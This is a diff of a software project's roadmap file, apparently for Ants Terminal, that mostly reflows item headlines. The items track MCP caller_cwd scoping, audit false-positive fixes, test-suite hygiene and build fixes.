   Source: cross-session-report-2026-05-15.
 
-- ✅ [ANTS-1414] **Expose `cross_doc_diff` regex hotspot
-  primitive for indie-review report corroboration.** Cross-
+- ✅ [ANTS-1414] **Expose `cross_doc_diff` regex hotspot primitive for indie-review report corroboration.** Cross-
   session report 2026-05-15 confirmed `cold_eyes_cross_doc_diff`
   works well: regex-based hotspot detection across reviewer
   reports is fast (no LLM cost), produced useful signal at
@@ -8069,8 +7967,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: in-session-2026-05-16 (deferred from ANTS-1404 § Out
   of scope).
 
-- ✅ [ANTS-1416] **Hoist `session_memory`'s RcGate into the
-  dispatcher's `Required` contract.** ANTS-1336 (shipped
+- ✅ [ANTS-1416] **Hoist `session_memory`'s RcGate into the dispatcher's `Required` contract.** ANTS-1336 (shipped
   2026-05-16) made `session_memory` require `caller_cwd` for
   every op via an in-handler `RcGate::checkCallerCwd` call.
   ANTS-1404's dispatcher framework could enforce the same gate
@@ -8092,8 +7989,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: in-session-2026-05-16 (self-observed during ANTS-1336
   + ANTS-1404 design).
 
-- ✅ [ANTS-1417] **Test asserts every registered tool has a
-  `CallerCwdContract` classification entry.** ANTS-1404 § 4
+- ✅ [ANTS-1417] **Test asserts every registered tool has a `CallerCwdContract` classification entry.** ANTS-1404 § 4
   INV-4 documents that unclassified tools default to `Optional`
   (gracious degradation). But there's no test that catches an
   *intentional* Required tool added without a classification
@@ -8113,8 +8009,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   implementation; the INV-1 promise was logged but the test was
   never created).
 
-- ✅ [ANTS-1418] **Refusal envelopes name `caller_cwd_info` as
-  the diagnostic path.** ANTS-1400 shipped the diagnostic verb
+- ✅ [ANTS-1418] **Refusal envelopes name `caller_cwd_info` as the diagnostic path.** ANTS-1400 shipped the diagnostic verb
   but ANTS-1404's refusal envelope says "Pass your $PWD as
   caller_cwd" without mentioning the verb that lets the caller
   *confirm* their cwd would resolve correctly. When a refusal
@@ -8135,8 +8030,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: in-session-2026-05-16 (self-observed: the diagnostic
   verb exists but is undiscoverable from the refusal path).
 
-- ✅ [ANTS-1419] **Hoist `CallerCwdContract` declaration into
-  `registerToolProvider` signature.** Shipped 2026-05-19 (Pull 28).
+- ✅ [ANTS-1419] **Hoist `CallerCwdContract` declaration into `registerToolProvider` signature.** Shipped 2026-05-19 (Pull 28).
   `registerToolProvider` now takes the per-tool `CallerCwdContract`
   as a 2nd positional argument; all 44 mainwindow.cpp call sites
   pass their contract explicitly (compile-time enforced via
@@ -8162,8 +8056,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: in-session-2026-05-16 (self-observed during ANTS-1404
   design; table-vs-registration trade-off).
 
-- ✅ [ANTS-1420] **Drop deprecated `cwd` field from
-  `session_memory` schema in 0.7.93.** ANTS-1336 (shipped
+- ✅ [ANTS-1420] **Drop deprecated `cwd` field from `session_memory` schema in 0.7.93.** ANTS-1336 (shipped
   2026-05-16) marked the `cwd` field as DEPRECATED in the
   schema descriptor at `claudeintegration.cpp:2596–2606` with
   a "handler ignores; removed in 0.7.93" description. Field
@@ -8184,9 +8077,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   ANTS-1336's two-release migration window).
   Shipped 2026-05-29. Removed cwdProp object and props["cwd"] assignment from claudeintegration.cpp session_memory schema. With additionalProperties:false, callers still sending cwd get a validation error — migration window (0.7.92) is closed.
 
-- ✅ [ANTS-1422] **`token_usage` refuses with
-  `no_claude_integration` on a live, configured Ants —
-  measurement instrument broken.** Shipped 2026-05-16 (Bundle C
+- ✅ [ANTS-1422] **`token_usage` refuses with `no_claude_integration` on a live, configured Ants — measurement instrument broken.** Shipped 2026-05-16 (Bundle C
   pulls 1+2+3).
   **2026-05-16 pull 3 (production close-out):** Pulls 1+2 left
   ANTS-1422 production-bypassed but root-cause unresolved. After
@@ -8291,8 +8182,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: in-session-2026-05-16 (user-observed during
   Bundle C kickoff).
 
-- ✅ [ANTS-1423] **Roadmap dialog "Current" preset shows
-  ✅ shipped items mixed with planned / in-progress.**
+- ✅ [ANTS-1423] **Roadmap dialog "Current" preset shows ✅ shipped items mixed with planned / in-progress.**
   User screenshot 2026-05-16 (during Bundle C kickoff)
   shows the Current tab listing "8 shipped" /
   "1 in progress" / "1 planned" headers — but `Current`
@@ -8320,9 +8210,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Source: user-report-2026-05-16 (Bundle C kickoff
   screenshot).
 
-- ✅ [ANTS-1424] **MCP `roadmap_log` write verb — let
-  Claude append roadmap items without hand-editing
-  `ROADMAP.md`.** Shipped 2026-05-16 (Bundle C pull 6). Today the assistant has `roadmap_query`
+- ✅ [ANTS-1424] **MCP `roadmap_log` write verb — let Claude append roadmap items without hand-editing `ROADMAP.md`.** Shipped 2026-05-16 (Bundle C pull 6). Today the assistant has `roadmap_query`
   (read) but no write surface; logging a new item means
   Edit-tool against ROADMAP.md plus a manual bump of
   `.roadmap-counter`. User observation 2026-05-16:
@@ -9097,8 +8985,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Lanes: ants_audit_lib, CMakeLists.txt.
   Source: deferred from ANTS-1351 § 9 Q5 (cold-eyes loop 3 2026-05-17).
 
-- 📋 [ANTS-1705] **Narrow `ants_core_lib`'s `Qt6::Widgets` link to
-  realize the ANTS-1444 split benefit.** `ants_core_lib` links
+- 📋 [ANTS-1705] **Narrow `ants_core_lib`'s `Qt6::Widgets` link to realize the ANTS-1444 split benefit.** `ants_core_lib` links
   `Qt6::Widgets PUBLIC`, so every downstream lib — including the now
   TU-clean `ants_audit_lib` — still pulls the Widgets surface
   transitively. To make the audit engine genuinely Widgets-free (so a
@@ -9290,8 +9177,7 @@ fixes don't address. Roadmapped here as their own design tasks.
   Resolved 2026-07-03. All concrete v2 deliverables shipped; nothing left to code. (1) JSON pattern source-of-truth (docs/standards/test-audit-grep-patterns.json) + drift-guard test (tests/features/test_audit_pattern_drift/, INV-D1..D4) shipped Pull 46 — both verified present on disk. (2) Envelope byte-cap for pre_pass_findings_by_chunk shipped via ANTS-2070 (24 KiB inline cap → omit-and-flag with pre_pass_omitted/_bytes + per-chunk test_audit_brief fallback; map stays in partition cache) and ANTS-2096 (pagination keeps the cached map for brief). (3) Recursive mtime recheck + pre-pass token recompute in brief/synth: subsumed by ANTS-1447 (✅), which resolved the deep-tree mtime gap as accept-the-gap (documented in ANTS-1397 INV-15 — bounded shallow recheck over top-level test_globs roots + 5 s rate-limit; never a wrong answer, only a stale set missing a just-added deep file). Not building speculative inotify / recursive-mtime infra absent a reported stale-brief bug (CLAUDE.md §2/§9). Revisit if feedback flags one.
   Status conflict noticed 2026-07-25 (cold-eyes ANTS-1397 loop 8): this bullet is marked ✅ but its own body reads "In progress … Remaining (still open under this item): recursive mtime recheck …, pre_pass token recompute in brief/synth". Loop 8 verified against source that both remainders are indeed still unbuilt — TestAuditEngine writes mtimeWalkComputedAt and never reads it, brief's recheck block stats nothing (carrying an in-code "v1 skips" comment), synth has no recheck block, and computeToken is called only from partition(). So the body is right and the ✅ is wrong. Flip to 🚧 (or split the shipped part out and leave the remainder as its own planned item) — a ✅ over an explicitly-unfinished body is exactly the kind of status drift that makes the roadmap unreliable as a source of truth. Cross-ref: docs/specs/ANTS-1397.md INV-15 now points here rather than at ANTS-1447, which shipped doc-only (it documented the gap as an accepted v1 limitation rather than closing it).
 
-- ✅ [ANTS-1646] **`roadmap_log` duplicate-ID guard +
-  `.roadmap-counter` drift detector.** Shipped 2026-05-19 (Pull
+- ✅ [ANTS-1646] **`roadmap_log` duplicate-ID guard + `.roadmap-counter` drift detector.** Shipped 2026-05-19 (Pull
   32). Both halves of the fix landed: (a) the `roadmap_query`
   envelope now carries `duplicate_ids[]` when the parser saw the
   same `[PROJ-NNNN]` id on more than one bullet — each entry
@@ -11269,8 +11155,7 @@ the single highest-impact FP lever (untuned SAST 30-60% FP → tuned
 report initial FP rates 92% → as low as 6%); fingerprint/data-flow
 suppression that survives line drift.
 
-- ✅ [ANTS-1707] **Audit FP fixes — `#pragma once` whole-file match +
-  build-dir glob exclusion.** Shipped 2026-05-20. Two verified
+- ✅ [ANTS-1707] **Audit FP fixes — `#pragma once` whole-file match + build-dir glob exclusion.** Shipped 2026-05-20. Two verified
   FP-generators in `auditdialog.cpp` killed: (a) the `header_guards`
   rule used `head -30` to find a guard, so the three engine headers
   (`testauditengine.h`, `coldeyesengine.h`, `indiereviewengine.h`) whose
@@ -11291,9 +11176,7 @@ suppression that survives line drift.
   Lanes: auditdialog.
   Source: self-audit 2026-05-20.
 
-- 📋 [ANTS-1706] **Headless audit FP-parity — run the AuditDialog
-  filter + baseline + AI-triage pipeline in `ants-audit` CLI / MCP
-  `audit_run`.** The report that triggered this section came from the
+- 📋 [ANTS-1706] **Headless audit FP-parity — run the AuditDialog filter + baseline + AI-triage pipeline in `ants-audit` CLI / MCP `audit_run`.** The report that triggered this section came from the
   headless generator, which emits raw aggregated findings: no
   baseline-diff, no `.audit_suppress`/comment-strip/dedup beyond the
   basics, no AI-triage verdict, no confidence floor. The GUI applies all
@@ -11313,8 +11196,7 @@ suppression that survives line drift.
   Source: self-audit 2026-05-20; pairs with ANTS-1449.
   Progress (2026-07-25): one of the three legs landed via ANTS-3615 — the `.audit_allowlist.json` custom-regex filter is no longer GUI-only; its loader/matcher moved into AuditEngine and `runAudit` applies it per finding, alongside the ANTS-1820 learned-FP ledger, with the `suppressions` request field now governing both. So headless sweeps get the dialog's *pre-triage drop* parity. STILL OPEN, and this item stays the tracker for them: (i) baseline-diff — "new since `.audit_cache/baseline.json`" needs a `baseline` / `--new-only` request option (note ANTS-1870's since-last-run delta is adjacent but distinct: it diffs against the PRIOR RUN's findings sidecar, not a pinned baseline); (ii) a confidence floor — `AuditEngine::computeConfidence` exists but `runAudit` never materialises `Finding` objects, so wiring it means the v2 per-finding path deciding whether to build them; (iii) the AI-triage stage, which needs an LLM round-trip the headless verb currently has no seam for. Re-scope (i)+(ii) as one item and (iii) separately when picked up — they have very different costs.
 
-- ✅ [ANTS-1708] **Persistent fingerprint-keyed FP-suppression ledger
-  for static-audit findings.** Shipped 2026-05-20. Confirmed the premise:
+- ✅ [ANTS-1708] **Persistent fingerprint-keyed FP-suppression ledger for static-audit findings.** Shipped 2026-05-20. Confirmed the premise:
   `computeDedup` hashes `file:line:checkId:title`, so `.audit_suppress`
   (keyed by `dedupKey`) IS line-grain and loses its suppression the moment
   code above a finding shifts its line. New module `auditfpledger.{h,cpp}`
@@ -11341,8 +11223,7 @@ suppression that survives line drift.
   Lanes: auditengine, auditfpledger, auditdialog, tests.
   Source: self-audit 2026-05-20.
 
-- ✅ [ANTS-1709] **Grep-rule hygiene pass — framework-awareness,
-  centralized exclusion set, per-rule fixtures.** Shipped 2026-05-20.
+- ✅ [ANTS-1709] **Grep-rule hygiene pass — framework-awareness, centralized exclusion set, per-rule fixtures.** Shipped 2026-05-20.
   (b) **Root-caused the `build-fast` miss (DONE).** The directory set
   every scanner skips (VCS, vendored code, language caches, our artifact
   dirs, the `build*` glob family) now lives in ONE place —
@@ -11459,8 +11340,7 @@ suppression that survives line drift.
 Items surfaced by the audit cycle that aren't tied to a single
 indie-review finding.
 
-- 📋 [ANTS-1361] **Locale-independent grapheme width via
-  vendored Unicode table.** `wcwidth(static_cast<wchar_t>(cp))`
+- 📋 [ANTS-1361] **Locale-independent grapheme width via vendored Unicode table.** `wcwidth(static_cast<wchar_t>(cp))`
   at `terminalgrid.cpp:385` is glibc-dependent: lags Unicode by
   1–2 versions, `LANG=C` renders CJK single-width, emoji ZWJ
   sequences disagree across libc versions. Project standards
@@ -11500,8 +11380,7 @@ indie-review finding.
   Kind: perf.
   Source: indie-review-2026-05-14 (lane-1 open question).
 
-- ✅ [ANTS-1363] **Status-bar refresh pauses on
-  window-unfocus.** The 2 s timer in
+- ✅ [ANTS-1363] **Status-bar refresh pauses on window-unfocus.** The 2 s timer in
   `ClaudeStatusBarController::refresh*` fires regardless of
   whether the Ants window is focused. On laptops, an
   unfocused Ants tab in a background workspace pays per-tick
@@ -11587,8 +11466,7 @@ indie-review finding.
   Source: indie-review-2026-05-14 (self-observed).
   Resolved-by-design (2026-06-27): both named gitleaks FP sources are already filtered built-in, not via a persisted .gitleaks.toml. auditdialog.cpp's skip fn excludes tests/audit_fixtures/ (covers secrets_scan/bad.cpp) and AUTOMATED_AUDIT_REPORT_*.json (reAuditReport regex). The chosen mechanism is a built-in skip that ships without per-project config (comment: "Scoped here rather than as a per-project path_rule so the skip ships built-in"), and auditrunner.cpp writes a throwaway gitleaks --config (ANTS-2016) for build/.audit_cache pruning. Adding a tracked .gitleaks.toml would contradict that design; no action needed.
 
-- ✅ [ANTS-1370] **`m_engines.insert` duplicate-key guard
-  (lane-6 L-4).** Even after the ANTS-1370 (lane-6 C-1) name-
+- ✅ [ANTS-1370] **`m_engines.insert` duplicate-key guard (lane-6 L-4).** Even after the ANTS-1370 (lane-6 C-1) name-
   spoofing fix, two plugin directories with the same
   canonical name across symlink shenanigans could still
   collide silently on `m_engines.insert`. Add an explicit
@@ -11600,8 +11478,7 @@ indie-review finding.
   Source: indie-review-2026-05-14 (lane-6 L-4).
   Resolved (2026-06-27): added an m_engines.contains() guard at the top of loadPlugin — a duplicate canonical name is now refused with a log line, not silently overwritten (leaking the first engine/thread).
 
-- ✅ [ANTS-1645] **`DBGLOG` macro uses GNU
-  `##__VA_ARGS__` token-paste extension.** Renumbered from
+- ✅ [ANTS-1645] **`DBGLOG` macro uses GNU `##__VA_ARGS__` token-paste extension.** Renumbered from
   ANTS-1415 (duplicate-ID collision with Phase 3b TabSpecific
   contract enforcement at line 5597); the latter was added
   2026-05-16 and is the canonical owner.  Surfaced during the
@@ -11624,8 +11501,7 @@ indie-review finding.
   ANTS-1333 fix build).
   Resolved (2026-06-27): already fixed under ANTS-1792 — DBGLOG in terminalgrid.cpp:18 uses C++20 __VA_OPT__(,); no remaining ##__VA_ARGS__ usages in any .cpp. Stale item; flipped on verification.
 
-- 📋 [ANTS-1408] **Archive-rotate shipped 0.7.x sections out of
-  `ROADMAP.md`.** Current file: 12,373 lines / ~657 KiB. Nine
+- 📋 [ANTS-1408] **Archive-rotate shipped 0.7.x sections out of `ROADMAP.md`.** Current file: 12,373 lines / ~657 KiB. Nine
   fully-shipped h2 sections — `0.7.0`, `0.7.7`, `0.7.12`,
   `0.7.50–0.7.59`, `0.7.78`, `0.7.79`, `0.7.80–0.7.84` — account
   for ~9,000 lines of historical detail that's never consulted in
@@ -11647,8 +11523,7 @@ indie-review finding.
   Source: in-session-2026-05-15 (self-observed while reading
   ROADMAP for the bundle plan above).
 
-- ✅ [ANTS-1409] **Per-tool MCP descriptor blurbs duplicate the
-  "Pass `caller_cwd` to anchor to…" phrasing.** Shipped
+- ✅ [ANTS-1409] **Per-tool MCP descriptor blurbs duplicate the "Pass `caller_cwd` to anchor to…" phrasing.** Shipped
   2026-05-16 (Bundle C pull 1). New `callerCwdSuffix` lambda
   in `claudeintegration.cpp`'s `tools/list` handler (adjacent
   to `makeCallerCwdReadProp`) returns the canonical short
@@ -11679,8 +11554,7 @@ indie-review finding.
   Source: in-session-2026-05-15 (self-observed while preparing
   the bundle plan).
 
-- 📋 [ANTS-1376] **Claude Code ghost-suggestion auto-submits
-  on Enter — verify Ants Terminal behavior.** Claude Code
+- 📋 [ANTS-1376] **Claude Code ghost-suggestion auto-submits on Enter — verify Ants Terminal behavior.** Claude Code
   renders a faded next-step suggestion in its prompt area
   (terminal cells, drawn via SGR-faded text the cursor sits
   in). User report 2026-05-15: in Konsole, pressing Enter
@@ -12724,8 +12598,7 @@ test-mode without restoring leaks state into siblings) and
 exact string exists in the source" for one-shot refactors
 that shipped 6+ months ago — pure self-reference).
 
-- 📋 [ANTS-1379] **Test env-pollution sweep — bundle-wide
-  RAII for `qputenv` / `setTestModeEnabled` / `umask`.**
+- 📋 [ANTS-1379] **Test env-pollution sweep — bundle-wide RAII for `qputenv` / `setTestModeEnabled` / `umask`.**
   ~10 tests call `qputenv("XDG_CONFIG_HOME"|"XDG_DATA_HOME"|
   "HOME")` without restoring; `tab_color.cpp:221`
   permanently flips `QStandardPaths::setTestModeEnabled(true)`
@@ -12747,9 +12620,7 @@ that shipped 6+ months ago — pure self-reference).
   Source: test-suite-audit-2026-05-15 (lane B).
   Status re-verified 2026-06-28: the LIVE-LEAK portion of this item is already fixed. (1) The shared RAII helper this item asked to "extract to tests/_support/sandbox.h" now exists as `tests/_support/xdg_guard.h` (ants_test::XdgGuard, shipped by ANTS-2062) — env save/restore + setTestMode + reverse-order restore + move-only. (2) Both specifically-named unrestored offenders are converged onto it: tab_color and kwin_position_tracker now `#include xdg_guard.h` (the permanent setTestModeEnabled(true) flip is gone). remote_control_opt_in, roadmap_density, audit_command_rule_trust, model_near_miss_ledger, dialog_chrome_affordances also migrated. RESIDUAL (not a live bug): ~10 config/feature tests still carry hand-rolled save/restore guards that DO restore (manually) but duplicate XdgGuard and aren't exception-safe on early gtest-ASSERT unwind — mcp_master_toggle, config_reload_loop_safety, config_tab_title_format, config_ai_review_concurrency, config_parse_failure_guard (NB: carries an explicit "do NOT use [guard] here" comment — needs per-file care), shell_command_wiring, session_persistence_default, debuglog_perms, claude_session_freshness, auto_switch_surfacing, ui_state_persistence, tool_detection_engine, claude_tab_status_indicator. This is an incremental convergence chore (dedup + exception-safety), best done one-file-at-a-time with per-file test verification, not a batch. Recommend a dedicated session.
 
-- ✅ [ANTS-1380] **`concurrent_writer_lock` predictable
-  `/tmp/ants-cwl-<pid>-<time>.dat` + symlink-attack
-  exposure.** `tests/features/concurrent_writer_lock/
+- ✅ [ANTS-1380] **`concurrent_writer_lock` predictable `/tmp/ants-cwl-<pid>-<time>.dat` + symlink-attack exposure.** `tests/features/concurrent_writer_lock/
   test_concurrent_writer_lock.cpp:69` builds a predictable
   filename in `/tmp`; the child's `::open(O_RDWR|O_CREAT,
   0600)` follows symlinks (no `O_NOFOLLOW` / `O_EXCL`).
@@ -12766,8 +12637,7 @@ that shipped 6+ months ago — pure self-reference).
   Source: test-suite-audit-2026-05-15 (lane B).
   Resolved (2026-06-28): concurrent_writer_lock now roots its lock file in a private QTemporaryDir (0700, random name, auto-removed) instead of the predictable /tmp/ants-cwl-<pid>-<time>.dat, and the child's lock open gains O_NOFOLLOW (defence-in-depth). Closes the symlink-attack window. Verified: ConcurrentWriterLock.Main passes, no predictable /tmp literal remains. SCOPE CORRECTION on the second named site: claude_status_bar_per_tab's `/tmp/projects/dummy/<uuid>.jsonl` is NOT a vulnerability — verified the transcript path is only ever basename-compared (setTranscriptPathForTest → confused-deputy guard), never opened or created, so there is no symlink window; kFocusedSession is a fixed UUID-shaped constant, not a real path. Left as-is (converting a never-opened synthetic path to QTemporaryDir would be pointless churn). Also corrected the roadmap's prescription: O_EXCL was NOT applied — the child must open the *existing* lock file (pre-created by the parent ConfigWriteLock) to contend on the flock, so O_EXCL would break the test; O_NOFOLLOW alone is correct. Production ConfigWriteLock unchanged (its real path is the user-private config dir, never /tmp).
 
-- ✅ [ANTS-1381] **Delete decayed source-grep tripwires
-  (~2000 LoC, zero behavioural coverage loss).** Four
+- ✅ [ANTS-1381] **Delete decayed source-grep tripwires (~2000 LoC, zero behavioural coverage loss).** Four
   `*_extraction` tests freeze one-shot refactors that
   shipped ≥ 6 months ago (`claude_statusbar_extraction`,
   `diffviewer_extraction`, `audit_engine_extraction`,
@@ -12804,8 +12674,7 @@ that shipped 6+ months ago — pure self-reference).
 
   Follow-up coverage gaps surfaced for diffviewer::show and the `// audit: drop` alias — see ANTS-3355. Net: 1 test removed (~336 LoC, 1 link step), 5 retained with rationale. The original ~2000 LoC / 5-link-step estimate does not hold.
 
-- ✅ [ANTS-1382] **Extract `tests/_support/expect.h` —
-  buffer-on-success + drop `if (runMain != 0) FAIL();`.**
+- ✅ [ANTS-1382] **Extract `tests/_support/expect.h` — buffer-on-success + drop `if (runMain != 0) FAIL();`.**
   ~80 test files reimplement the same `int g_failures;
   void expect(bool, const char*, const QString&)` helper
   that unconditionally `fprintf(stderr, "[PASS] …")` on
@@ -12843,8 +12712,7 @@ that shipped 6+ months ago — pure self-reference).
   Kind: refactor.
   Source: test-suite-audit-2026-05-15 (lane D).
 
-- ✅ [ANTS-1385] **Bulk-migrate remaining ~47 tests to
-  `ANTS_TEST_SCOPE()`.** Phase 2 of ANTS-1382, shipped 2026-05-15.
+- ✅ [ANTS-1385] **Bulk-migrate remaining ~47 tests to `ANTS_TEST_SCOPE()`.** Phase 2 of ANTS-1382, shipped 2026-05-15.
   Iterated `tools/migrate_expect_helper.py` to recognise five
   patterns (A/B/C/E/G) plus orphan-increment converter for
   setup-error sites. 41 files auto-migrated by the script,
@@ -12862,8 +12730,7 @@ that shipped 6+ months ago — pure self-reference).
   Kind: refactor.
   Source: ANTS-1382-phase-2 (2026-05-15).
 
-- 📋 [ANTS-1383] **Re-enable shared bundle PCH +
-  `gtest_discover_tests POST_BUILD`.** The
+- 📋 [ANTS-1383] **Re-enable shared bundle PCH + `gtest_discover_tests POST_BUILD`.** The
   `target_precompile_headers REUSE_FROM ants-terminal` line
   was dropped in ANTS-1373 because of a `-Winvalid-pch`
   rejection (PIC + `QT_OPENGL_LIB` flag delta). On closer
@@ -12888,8 +12755,7 @@ that shipped 6+ months ago — pure self-reference).
   Kind: perf.
   Source: test-suite-audit-2026-05-15 (lane E).
 
-- 📋 [ANTS-1384] **Remaining test perf — sleep-free reflow,
-  bench gate, fixture-size caps.** Cluster of smaller perf
+- 📋 [ANTS-1384] **Remaining test perf — sleep-free reflow, bench gate, fixture-size caps.** Cluster of smaller perf
   fixes from the audit: (a) `osc8_apc_memory_caps`
   `ApcOverflowDropped` reduces overflow margin from `+1024
   bytes` to `+1` (cap+1 still trips drop) — saves ~1.5 s.
@@ -12916,8 +12782,7 @@ that shipped 6+ months ago — pure self-reference).
   Kind: perf.
   Source: test-suite-audit-2026-05-15 (lane A residual).
 
-- 📋 [ANTS-1386] **Migrate remaining fixed-window source-grep tests
-  to `tests/_support/srcgrep.h::slurpFunctionBody`.** ANTS-1348
+- 📋 [ANTS-1386] **Migrate remaining fixed-window source-grep tests to `tests/_support/srcgrep.h::slurpFunctionBody`.** ANTS-1348
   surfaced that `tests/features/remote_control_get_text/` used
   `rc.substr(gtPos, 2500)` to slurp `cmdGetText`'s body for the
   invariant greps. When the body grew past 2500 chars during the
@@ -12940,8 +12805,7 @@ that shipped 6+ months ago — pure self-reference).
   Kind: refactor.
   Source: in-session-2026-05-15 (ANTS-1348 implementation).
 
-- 📋 [ANTS-1387] **`test_core` link closure limitation —
-  document or restructure.** `ants_core_lib` includes
+- 📋 [ANTS-1387] **`test_core` link closure limitation — document or restructure.** `ants_core_lib` includes
   `vtstream.cpp` (which uses `VtParser` from `ants_vt_lib`),
   `remotecontrol.cpp` (which uses `AuditEngine`, `FeatureCoverage`
   not in the lib's closure), and `debtsweepengine.cpp` (which uses
@@ -13000,8 +12864,7 @@ mostly closed by ANTS-1372's `RcGate::checkCallerCwd` on mutating
 ops; the residual read-path is intentional per ANTS-1372 INV-7
 (legitimate cross-project survey).
 
-- ✅ [ANTS-1391] **MCP "focused project" resolution now honours
-  caller_cwd on read verbs.** Shipped 2026-05-15. Added an
+- ✅ [ANTS-1391] **MCP "focused project" resolution now honours caller_cwd on read verbs.** Shipped 2026-05-15. Added an
   overload `resolveRootCanonical(MainWindow*, const QJsonObject&)`
   that prefers `caller_cwd` when present, falling back to the
   focused tab when absent (back-compat). Switched every read
@@ -13029,8 +12892,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: fix.
   Source: cross-session-report-2026-05-15.
 
-- ✅ [ANTS-1390] **MCP path-tool scope opt-in for `~/.claude/`
-  global config tree.** Shipped 2026-05-19 (pull 31). Added a
+- ✅ [ANTS-1390] **MCP path-tool scope opt-in for `~/.claude/` global config tree.** Shipped 2026-05-19 (pull 31). Added a
   `caller_cwd` sentinel (`~global` or alias `~claude-config`)
   recognised by `cmdWorkspaceSearch` and `cmdFileOutline` —
   when the caller passes either literal, the tool's root is
@@ -13093,8 +12955,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: refactor.
   Source: cross-session-report-2026-05-15.
 
-- ✅ [ANTS-1389] **MCP `caller_cwd` schema discoverability gap on
-  ANTS-1372-gated verbs.** Shipped 2026-05-15. Added `caller_cwd`
+- ✅ [ANTS-1389] **MCP `caller_cwd` schema discoverability gap on ANTS-1372-gated verbs.** Shipped 2026-05-15. Added `caller_cwd`
   (string) to every ANTS-1372-gated verb's `inputSchema.properties`
   with a description citing the ANTS-1372 cross-project gate.
   `verify_changes`, `indie_review_fold_in`, `cold_eyes_fold_in`,
@@ -13114,8 +12975,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: fix.
   Source: in-session-2026-05-15 (ANTS-1347 implementation).
 
-- ✅ [ANTS-1388] **`cmake --build --quiet` rejected by CMake —
-  verify_changes auto-detect emitted an invalid command.** Shipped
+- ✅ [ANTS-1388] **`cmake --build --quiet` rejected by CMake — verify_changes auto-detect emitted an invalid command.** Shipped
   2026-05-15. `cmake --build` does not accept `--quiet`; cmake
   responds with "Unknown argument --quiet" and prints its full
   usage banner. Two live sites were broken: `verifyengine::autoDetect`
@@ -13137,8 +12997,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: fix.
   Source: in-session-2026-05-15.
 
-- ✅ [ANTS-1392] **Terminal-state MCP verbs now anchor on caller's
-  tab.** Shipped 2026-05-15. Added
+- ✅ [ANTS-1392] **Terminal-state MCP verbs now anchor on caller's tab.** Shipped 2026-05-15. Added
   `MainWindow::terminalForCaller(callerCwd)` that walks every tab
   (split panes via `activeTerminalInTab`) for a terminal whose
   canonical `shellCwd()` matches the canonical `callerCwd`. First
@@ -13162,8 +13021,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: fix.
   Source: cross-session-report-2026-05-15.
 
-- ✅ [ANTS-1393] **`roadmap_query` registry-bridge lambda now
-  forwards `caller_cwd` — Phase-1 ANTS-1391 fix is live.** Shipped
+- ✅ [ANTS-1393] **`roadmap_query` registry-bridge lambda now forwards `caller_cwd` — Phase-1 ANTS-1391 fix is live.** Shipped
   2026-05-15. ANTS-1391 plumbed `caller_cwd` through
   `cmdRoadmapQuery` at `remotecontrol.cpp:738` and added the schema
   property, but the registry-bridge lambda at `mainwindow.cpp:3776`
@@ -13188,8 +13046,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: fix.
   Source: in-session-2026-05-15 (verifying ANTS-1391 post-restart).
 
-- ✅ [ANTS-1394] **`ANTS_BUILD_TIME` label is stale on incremental
-  rebuilds — ANTS-1323 regression.** Discovered 2026-05-15 by repro:
+- ✅ [ANTS-1394] **`ANTS_BUILD_TIME` label is stale on incremental rebuilds — ANTS-1323 regression.** Discovered 2026-05-15 by repro:
   source edits + `cmake --build build` produced a binary linked at
   14:13 but `Help → About` still showed `13:26` (the time `cmake -B
   build` last reconfigured). Root cause: `CMakeLists.txt:35`
@@ -13217,8 +13074,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Source: in-session-2026-05-15 (user spotted 13:26 stamp on a
   14:13 binary after ANTS-1392/1393 relaunch).
 
-- ✅ [ANTS-1395] **`tools/list` `-Wshadow` warnings —
-  scoped `get_scrollback` props/schema.** Shipped 2026-05-15.
+- ✅ [ANTS-1395] **`tools/list` `-Wshadow` warnings — scoped `get_scrollback` props/schema.** Shipped 2026-05-15.
   Wrapped `get_scrollback`'s `props` / `schema`
   declarations in their own `{...}` block at
   `claudeintegration.cpp:1361–1378` so the outer scope of
@@ -13231,8 +13087,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Source: in-session-2026-05-15 (incidental while
   implementing ANTS-1360).
 
-- ✅ [ANTS-1396] **`terminalForCaller` cross-project
-  fallback leak.** Shipped 2026-05-15. Reported in-session
+- ✅ [ANTS-1396] **`terminalForCaller` cross-project fallback leak.** Shipped 2026-05-15. Reported in-session
   by another CC instance: `mcp__ants__get_git_status` was
   returning the Ants Terminal repo's branch/status/log while
   the caller's `caller_cwd` pointed at a different project
@@ -13263,9 +13118,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   instance reported the leak; verified + fixed in this
   bundle).
 
-- ✅ [ANTS-1397] **Incorporate `/test-audit` skill into
-  Ants MCP — parallel to `indie_review_*` / `debt_sweep_*`
-  / `cold_eyes_*`.** The `/test-audit` skill today fires a
+- ✅ [ANTS-1397] **Incorporate `/test-audit` skill into Ants MCP — parallel to `indie_review_*` / `debt_sweep_*` / `cold_eyes_*`.** The `/test-audit` skill today fires a
   parallel-subagent sweep across the test suite (performance,
   flakiness, duplication, isolation, determinism, accuracy,
   security, verbosity), triaged into a prioritised list.
@@ -13288,8 +13141,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: implement.
   Source: in-session-2026-05-15 (user request).
 
-- ✅ [ANTS-1398] **`roadmap_query` filters out header-rollup
-  bullets server-side.** Shipped 2026-05-16 (Bundle C pull
+- ✅ [ANTS-1398] **`roadmap_query` filters out header-rollup bullets server-side.** Shipped 2026-05-16 (Bundle C pull
   2). `cmdRoadmapQuery` now drops section-rollup bullets
   (empty `id` AND empty `headline`, status emoji only) from
   `bullets[]` post-status filter, in both the full-file and
@@ -13316,8 +13168,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
